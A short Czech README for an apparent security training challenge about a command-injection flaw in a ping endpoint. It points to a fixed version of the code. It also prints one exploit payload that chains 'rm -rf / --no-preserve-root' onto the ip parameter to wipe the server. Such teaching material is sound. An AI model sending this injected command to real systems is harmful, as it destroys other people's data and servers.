# Výzva #1

- [zdrojový kód](app/main.py)

**Tento zdrojový kód je náchylný k:**

- Command Injection

Ukázka obsahuje i možnost opravy v [main_fix.py](app/main_fix.py)

## Možnosti exploitace

1. Přes Command Injection
    - `/ping?ip=8.8.8.8 | rm -rf / --no-preserve-root`
    - odešle `ping` a smaže data ze serveru, výsledek je nefunkční server!
